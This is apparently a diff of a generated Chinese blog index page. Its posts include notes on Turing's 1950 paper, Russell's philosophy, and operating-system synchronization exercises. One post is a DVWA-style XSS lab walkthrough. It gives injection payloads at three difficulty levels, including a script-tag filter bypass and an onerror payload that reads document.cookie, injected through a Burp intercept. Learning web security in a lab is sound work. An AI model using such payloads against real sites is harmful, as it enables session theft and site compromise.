+<p>在message栏输入<code>&lt;script&gt;alert("/xss/")&lt;/script&gt;</code></p>
 <p>可以看到浏览器上方弹出</p>
-<p><img src="/2022/03/08/%E7%BD%91%E7%BB%9C/xss%E7%AC%94%E8%AE%B0/image-20220308155737502.png" alt></p>
-<h4 id="在name进行xss攻击"><a href="#在name进行xss攻击" class="headerlink" title="在name进行xss攻击"></a>在name进行xss攻击</h4><p>由于name进行了输入字数的限制，我们用burp进行抓包。</p>
+<p><img src="/2022/03/08/%E7%BD%91%E7%BB%9C/xss%E7%AC%94%E8%AE%B0/image-20220308155737502.png"></p>
+<h4 id="在name进行xss攻击">在name进行xss攻击</h4>
+<p>由于name进行了输入字数的限制，我们用burp进行抓包。</p>
 <p>在name栏输入123，message栏输入123。在burp中的proxy栏打开intercept is on进行抓包。</p>
 <p>抓包结果如下：</p>
-<p><img src="/2022/03/08/%E7%BD%91%E7%BB%9C/xss%E7%AC%94%E8%AE%B0/image-20220308160339068.png" alt></p>
-<p>将txtname改为<code>&lt;script&gt;alert(&quot;/xss/&quot;)&lt;/script&gt;</code>，放开包，发现浏览器成功弹窗。</p>
-<p><img src="/2022/03/08/%E7%BD%91%E7%BB%9C/xss%E7%AC%94%E8%AE%B0/image-20220308155737502.png" alt></p>
-<h3 id="中等级-1"><a href="#中等级-1" class="headerlink" title="中等级"></a>中等级</h3><p>基于黑名单思想，使用str_replace()函数，将script关键词删除，但是这种机制是很容易绕过去的。</p>
+<p><img src="/2022/03/08/%E7%BD%91%E7%BB%9C/xss%E7%AC%94%E8%AE%B0/image-20220308160339068.png"></p>
+<p>将txtname改为<code>&lt;script&gt;alert("/xss/")&lt;/script&gt;</code>，放开包，发现浏览器成功弹窗。</p>
+<p><img src="/2022/03/08/%E7%BD%91%E7%BB%9C/xss%E7%AC%94%E8%AE%B0/image-20220308155737502.png"></p>
+<h3 id="中等级-1">中等级</h3>
+<p>基于黑名单思想，使用str_replace()函数，将script关键词删除，但是这种机制是很容易绕过去的。</p>
 <p>同理用burp进行抓包</p>
-<p><img src="/2022/03/08/%E7%BD%91%E7%BB%9C/xss%E7%AC%94%E8%AE%B0/image-20220308163010214.png" alt></p>
+<p><img src="/2022/03/08/%E7%BD%91%E7%BB%9C/xss%E7%AC%94%E8%AE%B0/image-20220308163010214.png"></p>
 <p>将message改为 <code>&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/script&gt;</code></p>
-<p><img src="/2022/03/08/%E7%BD%91%E7%BB%9C/xss%E7%AC%94%E8%AE%B0/image-20220308101757917.png" alt></p>
+<p><img src="/2022/03/08/%E7%BD%91%E7%BB%9C/xss%E7%AC%94%E8%AE%B0/image-20220308101757917.png"></p>
 <p>可以看到成功弹窗</p>
-<h3 id="高等级-1"><a href="#高等级-1" class="headerlink" title="高等级"></a>高等级</h3><p>同理进行抓包</p>
-<p><img src="/2022/03/08/%E7%BD%91%E7%BB%9C/xss%E7%AC%94%E8%AE%B0/image-20220308163311721.png" alt>改为 <code>&lt;img src=1 onerror=alert(document.cookie)&gt;</code></p>
+<h3 id="高等级-1">高等级</h3>
+<p>同理进行抓包</p>
+<p><img src="/2022/03/08/%E7%BD%91%E7%BB%9C/xss%E7%AC%94%E8%AE%B0/image-20220308163311721.png">改为 <code>&lt;img src=1 onerror=alert(document.cookie)&gt;</code></p>
 <p>放包可以看到成功进行了弹窗</p>
-<p><img src="/2022/03/08/%E7%BD%91%E7%BB%9C/xss%E7%AC%94%E8%AE%B0/image-20220308111137012.png" alt></p>
+<p><img src="/2022/03/08/%E7%BD%91%E7%BB%9C/xss%E7%AC%94%E8%AE%B0/image-20220308111137012.png"></p>
 
       
     </div>
@@ -772,6 +803,7 @@
 
       
           
+
       
     </div>
 
@@ -839,6 +871,7 @@
 
       
           
+
       
     </div>
 
@@ -905,20 +938,22 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h2 id="Computing-Machinery-and-Intelligence-1950"><a href="#Computing-Machinery-and-Intelligence-1950" class="headerlink" title="Computing Machinery and Intelligence (1950)"></a>Computing Machinery and Intelligence (1950)</h2><blockquote>
+          <h2 id="computing-machinery-and-intelligence-1950">Computing Machinery and Intelligence (1950)</h2>
+<blockquote>
 <p>计算机器与智能</p>
 </blockquote>
-<h3 id="1-The-Imitation-Game"><a href="#1-The-Imitation-Game" class="headerlink" title="1. The Imitation Game"></a>1. The Imitation Game</h3><blockquote>
+<h3 id="the-imitation-game">1. The Imitation Game</h3>
+<blockquote>
 <p>模仿游戏</p>
 </blockquote>
-<p>I propose to consider the question,’Can machines think?’ This should begin with definitions of the meaning of the terms ‘machine’ and ‘think’. The definitions might be framed so as to reflect so far as possible the normal use of the words,but this attitude is dangerous. If the meaning of the words ‘machine’ and ‘think’ are to be found by examining how they are commonly used it is difficult to escape the conclusion that the meaning and the answer to the question，’Can machines think?’is to be sought in a statistical survey such as a Gallup poll. But this is absurd. Instead of attempting such a definition I shall replace the question by another, which is closely related to it and is expressed in relatively unambiguous words.</p>
+<p>I propose to consider the question,'Can machines think?’ This should begin with definitions of the meaning of the terms 'machine’ and ‘think’. The definitions might be framed so as to reflect so far as possible the normal use of the words,but this attitude is dangerous. If the meaning of the words 'machine' and 'think' are to be found by examining how they are commonly used it is difficult to escape the conclusion that the meaning and the answer to the question，'Can machines think?'is to be sought in a statistical survey such as a Gallup poll. But this is absurd. Instead of attempting such a definition I shall replace the question by another, which is closely related to it and is expressed in relatively unambiguous words.</p>
 <blockquote>
 <p>我提议思考这样一个问题，‘机器可以思考吗’。这个问题应该从术语‘机器’和‘思考’这两个术语的意义的定义开始。这些定义也许从反映单词的正常用法而架构，但是这种态度是危险的。如果通过检查单词的一般用法，来得到单词‘机器’和‘思考’的含义，那么将很难不得出这样的结论：问题的意义和答案类似Gallup poll的统计调查中得到。但是这是荒唐的。为了不试图做出这样的定义，我会替换这个问题，它将和之前密切相关并用相对明确的词语。</p>
 </blockquote>
-<p>The new form of the problem can be described in terms of a game which we call the ‘imitation game’.It is played with three people, a man (A), a woman(B),and an interrogator (C) who may be of either sex. The interrogator stays in a room apart from the other two. The object of the game for the interrogator is to determine which of the other two is the man and which is the woman. He knows them by labels X and Y, and at the end of the game he says either ‘X is A and Y is B’ or ‘X is B and Y is A. The interrogator is allowed to put questions to A and B thus:</p>
-<p>C: Will X please tell me the length of his or her hair? Now suppose X is actually A, then A must answer. It is A’s object in the game to try and cause C to make the wrong identification. His answer might therefore be<br>‘My hair is shingled,and the longest strands are about nine inches long.’</p>
+<p>The new form of the problem can be described in terms of a game which we call the 'imitation game'.It is played with three people, a man (A), a woman(B),and an interrogator (C) who may be of either sex. The interrogator stays in a room apart from the other two. The object of the game for the interrogator is to determine which of the other two is the man and which is the woman. He knows them by labels X and Y, and at the end of the game he says either 'X is A and Y is B' or 'X is B and Y is A. The interrogator is allowed to put questions to A and B thus:</p>
+<p>C: Will X please tell me the length of his or her hair? Now suppose X is actually A, then A must answer. It is A's object in the game to try and cause C to make the wrong identification. His answer might therefore be ‘My hair is shingled,and the longest strands are about nine inches long.'</p>
 <blockquote>
-<p>新的问题可以描述为一种称之为模拟游戏的游戏。这个游戏有三个参与者，一个男人（A），一个女人（B），和一个可以为任意性别的审问者（C）。审问者呆在一个与其他两个人分开的房间里。这个游戏的目标是让审问者确定哪个房间里的是男人，哪个房间里的是女人。审问者知道两人的标签‘X’和’Y‘，在游戏的结尾他会说’X是A，Y是B‘或者’X是B，Y是A‘。这个审问者将可以给A和B类似这样的问题：</p>
+<p>新的问题可以描述为一种称之为模拟游戏的游戏。这个游戏有三个参与者，一个男人（A），一个女人（B），和一个可以为任意性别的审问者（C）。审问者呆在一个与其他两个人分开的房间里。这个游戏的目标是让审问者确定哪个房间里的是男人，哪个房间里的是女人。审问者知道两人的标签‘X'和’Y‘，在游戏的结尾他会说’X是A，Y是B‘或者’X是B，Y是A‘。这个审问者将可以给A和B类似这样的问题：</p>
 <p>C：X可以告诉我他或她的头发的长度吗？假设X就是A，那么A必须回答。A的目标是让C做出错误的判断。因此他的回答可以是：</p>
 <p>我的头发是墙面板式短发发型，最长的一缕大概与9英寸长。</p>
 </blockquote>
@@ -1003,9 +1038,10 @@
 
       
           <blockquote>
-<p>《西方哲学史》  罗素</p>
+<p>《西方哲学史》 罗素</p>
 </blockquote>
-<h4 id="第一篇-前苏格拉底哲学家"><a href="#第一篇-前苏格拉底哲学家" class="headerlink" title="第一篇   前苏格拉底哲学家"></a>第一篇   前苏格拉底哲学家</h4><ul>
+<h4 id="第一篇-前苏格拉底哲学家">第一篇 前苏格拉底哲学家</h4>
+<ul>
 <li>除了在恋爱和战争中而外，他们从来不说谎。</li>
 <li>唯有当一个人去做某一件事并不是因为受冲动的驱使，而是因为他的理性告诉他说，到了某个未来时期他会因此而受益的时候，这时候才出现了真正的深谋远虑。打猎不需要深谋远虑，因为那是愉快的；但耕种土地是一种劳动，而并不是出于自发的冲动就可以做得到的事。</li>
 <li>文明要想消灭冲动，不仅靠个人的理性，还要靠法律、道德、宗教。</li>
@@ -1014,12 +1050,14 @@
 <li>人类成就中最伟大的东西大部分都包含有某种沉醉的成分,某种程度上的以热情来扫除审慎。</li>
 <li>一部分希腊人被激烈的感情、苦闷的现实苦恼；另一部分趋于理智，自我认识清楚。正是这两 派人的共存造就了希腊的伟大，无论在思想上、艺 术上，还是宗教上。若是只有一派人，无论是冲动 的还是理智的，都不会改变世界。希腊最原始的神话形象不是神明宙斯，而是因带给人间火种而受苦受难的普罗米修斯。</li>
 </ul>
-<h5 id="第三章-毕达哥拉斯"><a href="#第三章-毕达哥拉斯" class="headerlink" title="第三章 毕达哥拉斯"></a>第三章 毕达哥拉斯</h5><ul>
+<h5 id="第三章-毕达哥拉斯">第三章 毕达哥拉斯</h5>
+<ul>
 <li>几何学对于哲学与科学方法的影响一直是深远的。希腊人所建立的几何学是从自明的,或者被认为是自明的公理出发,根据演绎的推理前进,而达到那些远不是自明的定理。公理和定理被认为对于实际空间是真确的,而实际空间又是经验中所有的东西。这样,首先注意到自明的东西然后再运用演绎法,就好像是可能发现实际世界中一切事物了。</li>
 <li>我相信,数学是我们信仰永恒的与严格的真理的主要根源,也是信仰有一个超感的可知的世界的主要根源。</li>
 <li>毕达哥拉斯那里得来的。如果不是他,基督徒便不会认为基督就是道;如果不是他,神学家就不会追求上帝存在与灵魂不朽的逻辑证明。但是在他的身上,这一切还都不显著。</li>
 </ul>
-<h5 id="第四章-赫拉克利特"><a href="#第四章-赫拉克利特" class="headerlink" title="第四章 赫拉克利特"></a>第四章 赫拉克利特</h5><ul>
+<h5 id="第四章-赫拉克利特">第四章 赫拉克利特</h5>
+<ul>
 <li>希腊人发现了数学推理和演绎的方法。 他们发明的几何学深深影响了近代科学。但是，几 何学也体现了希腊人片面的一面。他们根据现实进 行推理、演绎，得出的结论如果与现实不符，就认 为现实错了。这是片面的，后世被这种片面的观点 引入歧途。因此，不能盲目崇拜希腊人。虽然当时 有许多天才，但是不能无视近代思想的进步，只盯 着遥远的古希腊时期。</li>
 <li>赫拉克利特并没有流传下著作，他的言行多出 现在柏拉图和亚里士多德等人的著作的引文，而这 些引文大多是为了批判他才引证的。😂</li>
 <li>不断有人投身哲学领域进行研究的目的之一便 是追求永恒。这种追求是一种本能，最早是出于对 生活的热爱和灾难的躲避。（这里感觉很类似三体）</li>
@@ -1092,13 +1130,18 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h4 id="Process-Synchronization"><a href="#Process-Synchronization" class="headerlink" title="Process Synchronization"></a>Process Synchronization</h4><h5 id="5-1-In-Section-5-4-we-mentioned-that-disabling-interrupts-frequently-can-affect-the-system’s-clock-Explain-why-this-can-occur-and-how-such-effects-can-be-minimized-在5-4节我们提到如果频繁的禁用中断会影响系统时钟，解释为什么会发生并把影响减到最小。"><a href="#5-1-In-Section-5-4-we-mentioned-that-disabling-interrupts-frequently-can-affect-the-system’s-clock-Explain-why-this-can-occur-and-how-such-effects-can-be-minimized-在5-4节我们提到如果频繁的禁用中断会影响系统时钟，解释为什么会发生并把影响减到最小。" class="headerlink" title="5.1 In Section 5.4, we mentioned that disabling interrupts frequently can affect the system’s clock. Explain why this can occur and how such effects can be minimized.   在5.4节我们提到如果频繁的禁用中断会影响系统时钟，解释为什么会发生并把影响减到最小。"></a>5.1 In Section 5.4, we mentioned that disabling interrupts frequently can affect the system’s clock. Explain why this can occur and how such effects can be minimized.   在5.4节我们提到如果频繁的禁用中断会影响系统时钟，解释为什么会发生并把影响减到最小。</h5><p>The system clock is updated at every clock interrupt. If interrupts were disabled—particularly for a long period of time—it is possible the system clock could easily lose the correct time. The system clock is also used for scheduling purposes. For example, the time quantum for a process is expressed as a number of clock ticks. At every clock interrupt, the scheduler determines if the time quantum for the currently running process has expired. If clock interrupts were disabled, the scheduler could not accurately assign time quantum. This effect can be minimized by disabling clock interrupts for only very short periods.</p>
+          <h4 id="process-synchronization">Process Synchronization</h4>
+<h5 id="in-section-5.4-we-mentioned-that-disabling-interrupts-frequently-can-affect-the-systems-clock.-explain-why-this-can-occur-and-how-such-effects-can-be-minimized.-在5.4节我们提到如果频繁的禁用中断会影响系统时钟解释为什么会发生并把影响减到最小">5.1 In Section 5.4, we mentioned that disabling interrupts frequently can affect the system’s clock. Explain why this can occur and how such effects can be minimized. 在5.4节我们提到如果频繁的禁用中断会影响系统时钟，解释为什么会发生并把影响减到最小。</h5>
+<p>The system clock is updated at every clock interrupt. If interrupts were disabled—particularly for a long period of time—it is possible the system clock could easily lose the correct time. The system clock is also used for scheduling purposes. For example, the time quantum for a process is expressed as a number of clock ticks. At every clock interrupt, the scheduler determines if the time quantum for the currently running process has expired. If clock interrupts were disabled, the scheduler could not accurately assign time quantum. This effect can be minimized by disabling clock interrupts for only very short periods.</p>
 <p>系统时钟被每一个时钟中断所更新，如果中断被禁止，特别是很长的时间，那么系统时钟会丢失掉当前时间。系统时钟还用于系统调度。例如，进程的时间量表示为时钟信号的数量，在每个系统中断时，调度程序确定当前运行的时间量是否已过期。如果时钟中断被禁用，调度程序将无法准确分配时间量。这种影响可以通过在每次禁用中断只禁用很短的时间来解决。</p>
-<h5 id="5-2-Explain-why-Windows-Linux-and-Solaris-implement-multiple-locking-mechanisms-Describe-the-circumstances-under-which-they-use-spin-locks-mutex-locks-semaphores-adaptive-mutex-locks-and-condition-variables-In-each-case-explain-why-the-mechanism-is-needed-解释为什么windows，Linux-和-Solaris-实现多种锁机制。解释他们使用自旋锁，互斥锁信号量，自适应互斥锁和条件变量。在每种情况下，解释为什么这种锁机制是需要的。"><a href="#5-2-Explain-why-Windows-Linux-and-Solaris-implement-multiple-locking-mechanisms-Describe-the-circumstances-under-which-they-use-spin-locks-mutex-locks-semaphores-adaptive-mutex-locks-and-condition-variables-In-each-case-explain-why-the-mechanism-is-needed-解释为什么windows，Linux-和-Solaris-实现多种锁机制。解释他们使用自旋锁，互斥锁信号量，自适应互斥锁和条件变量。在每种情况下，解释为什么这种锁机制是需要的。" class="headerlink" title="5.2 Explain why Windows, Linux, and Solaris implement multiple locking mechanisms. Describe the circumstances under which they use spin-locks, mutex locks, semaphores, adaptive mutex locks, and condition variables. In each case, explain why the mechanism is needed.  解释为什么windows，Linux 和 Solaris 实现多种锁机制。解释他们使用自旋锁，互斥锁信号量，自适应互斥锁和条件变量。在每种情况下，解释为什么这种锁机制是需要的。"></a>5.2 Explain why Windows, Linux, and Solaris implement multiple locking mechanisms. Describe the circumstances under which they use spin-locks, mutex locks, semaphores, adaptive mutex locks, and condition variables. In each case, explain why the mechanism is needed.  解释为什么windows，Linux 和 Solaris 实现多种锁机制。解释他们使用自旋锁，互斥锁信号量，自适应互斥锁和条件变量。在每种情况下，解释为什么这种锁机制是需要的。</h5><p>These operating systems provide different locking mechanisms depending on the application developers’ needs. Spinlocks are useful for multiprocessor systems where a thread can run in a busy-loop (for a short period of time) rather than incurring the overhead of being put in a sleep queue. Mutexes are useful for locking resources. Solaris 2 uses adaptive mutexes, meaning that the mutex is implemented with a spin lock on multiprocessor machines. Semaphores and condition variables are more appropriate tools for synchronization when a resource must be held for a long period of time, since spinning is inefficient for a long duration.</p>
+<h5 id="explain-why-windows-linux-and-solaris-implement-multiple-locking-mechanisms.-describe-the-circumstances-under-which-they-use-spin-locks-mutex-locks-semaphores-adaptive-mutex-locks-and-condition-variables.-in-each-case-explain-why-the-mechanism-is-needed.-解释为什么windowslinux-和-solaris-实现多种锁机制解释他们使用自旋锁互斥锁信号量自适应互斥锁和条件变量在每种情况下解释为什么这种锁机制是需要的">5.2 Explain why Windows, Linux, and Solaris implement multiple locking mechanisms. Describe the circumstances under which they use spin-locks, mutex locks, semaphores, adaptive mutex locks, and condition variables. In each case, explain why the mechanism is needed. 解释为什么windows，Linux 和 Solaris 实现多种锁机制。解释他们使用自旋锁，互斥锁信号量，自适应互斥锁和条件变量。在每种情况下，解释为什么这种锁机制是需要的。</h5>
+<p>These operating systems provide different locking mechanisms depending on the application developers’ needs. Spinlocks are useful for multiprocessor systems where a thread can run in a busy-loop (for a short period of time) rather than incurring the overhead of being put in a sleep queue. Mutexes are useful for locking resources. Solaris 2 uses adaptive mutexes, meaning that the mutex is implemented with a spin lock on multiprocessor machines. Semaphores and condition variables are more appropriate tools for synchronization when a resource must be held for a long period of time, since spinning is inefficient for a long duration.</p>
 <p>这些操作系统提供了复杂的锁机制，依赖于应用开发者的需要。自旋锁对多处理器系统十分重要，因为对于自旋锁线程可以在忙等待运行而不是被放入睡眠队列，互斥锁对于锁资源非常重要。Solaris使用了自适应互斥锁意味着在多处理机上实现了自旋锁。信号量和条件变量对于同步来说更合适当资源需要被持有很长一段时间，因为自旋很长一段时间是低效的。</p>
-<h5 id="5-3-What-is-the-meaning-of-the-term-busy-waiting-What-other-kinds-of-waiting-are-there-in-an-operating-system-Can-busy-waiting-be-avoided"><a href="#5-3-What-is-the-meaning-of-the-term-busy-waiting-What-other-kinds-of-waiting-are-there-in-an-operating-system-Can-busy-waiting-be-avoided" class="headerlink" title="5.3 What is the meaning of the term busy waiting? What other kinds of waiting are there in an operating system? Can busy waiting be avoided"></a>5.3 What is the meaning of the term busy waiting? What other kinds of waiting are there in an operating system? Can busy waiting be avoided</h5><p>altogether? Explain your answer. 忙等待是什么意思，还有其他的什么等待，忙等待可以完全避免吗？</p>
-<p>Busy waiting means that a process is waiting for a condition to be satisfied<br>in a tight loop without relinquishing the processor. Alternatively, a<br>process could wait by relinquishing the processor, and block on a<br>condition and wait to be awakened at some appropriate time in the<br>future. Busy waiting can be avoided but incurs the overhead associated<br>with putting a process to sleep and having to wake it up when the<br>appropriate program state is reached. 忙等待意味着进程在一个小的循环中等待条件满足而不放弃处理器。另外的一个进程可以放弃处理器并等待，他可以被条件阻塞然后在合适的时机被唤醒。可以避免忙等待但需花费将进程置于忙状态并将他唤醒的开销。</p>
-<h5 id="5-4-Explain-why-spinlocks-are-not-appropriate-for-single-processor-systems-yet-are-often-used-in-multiprocessor-systems-解释自旋锁为什么对单进程系统不合适并且经常使用在多处理器系统中。"><a href="#5-4-Explain-why-spinlocks-are-not-appropriate-for-single-processor-systems-yet-are-often-used-in-multiprocessor-systems-解释自旋锁为什么对单进程系统不合适并且经常使用在多处理器系统中。" class="headerlink" title="5.4 Explain why spinlocks are not appropriate for single-processor systems yet are often used in multiprocessor systems. 解释自旋锁为什么对单进程系统不合适并且经常使用在多处理器系统中。"></a>5.4 Explain why spinlocks are not appropriate for single-processor systems yet are often used in multiprocessor systems. 解释自旋锁为什么对单进程系统不合适并且经常使用在多处理器系统中。</h5><p>Spinlocks are not appropriate for single-processor systems because the<br>condition that would break a process out of the spinlock can be obtained<br>only by executing a different process. If the process is not relinquishing<br>the processor, other processes do not get the opportunity to set the<br>program condition required for the first process to make progress. In a<br>multiprocessor system, other processes execute on other processors and<br>thereby modify the program state in order to release the first process<br>from the spinlock.   对于单进程系统，自旋锁不合适因为可以打破进程自旋锁的条件必须被一个正在执行的程序所持有。其他进程没有机会获得释放所得的条件。在多进程系统中，其他进程可以执行在其他处理器上，因此可以修改状态以释放自旋锁。</p>
+<h5 id="what-is-the-meaning-of-the-term-busy-waiting-what-other-kinds-of-waiting-are-there-in-an-operating-system-can-busy-waiting-be-avoided">5.3 What is the meaning of the term busy waiting? What other kinds of waiting are there in an operating system? Can busy waiting be avoided</h5>
+<p>altogether? Explain your answer. 忙等待是什么意思，还有其他的什么等待，忙等待可以完全避免吗？</p>
+<p>Busy waiting means that a process is waiting for a condition to be satisfied in a tight loop without relinquishing the processor. Alternatively, a process could wait by relinquishing the processor, and block on a condition and wait to be awakened at some appropriate time in the future. Busy waiting can be avoided but incurs the overhead associated with putting a process to sleep and having to wake it up when the appropriate program state is reached. 忙等待意味着进程在一个小的循环中等待条件满足而不放弃处理器。另外的一个进程可以放弃处理器并等待，他可以被条件阻塞然后在合适的时机被唤醒。可以避免忙等待但需花费将进程置于忙状态并将他唤醒的开销。</p>
+<h5 id="explain-why-spinlocks-are-not-appropriate-for-single-processor-systems-yet-are-often-used-in-multiprocessor-systems.-解释自旋锁为什么对单进程系统不合适并且经常使用在多处理器系统中">5.4 Explain why spinlocks are not appropriate for single-processor systems yet are often used in multiprocessor systems. 解释自旋锁为什么对单进程系统不合适并且经常使用在多处理器系统中。</h5>
+<p>Spinlocks are not appropriate for single-processor systems because the condition that would break a process out of the spinlock can be obtained only by executing a different process. If the process is not relinquishing the processor, other processes do not get the opportunity to set the program condition required for the first process to make progress. In a multiprocessor system, other processes execute on other processors and thereby modify the program state in order to release the first process from the spinlock. 对于单进程系统，自旋锁不合适因为可以打破进程自旋锁的条件必须被一个正在执行的程序所持有。其他进程没有机会获得释放所得的条件。在多进程系统中，其他进程可以执行在其他处理器上，因此可以修改状态以释放自旋锁。</p>
 
       
     </div>
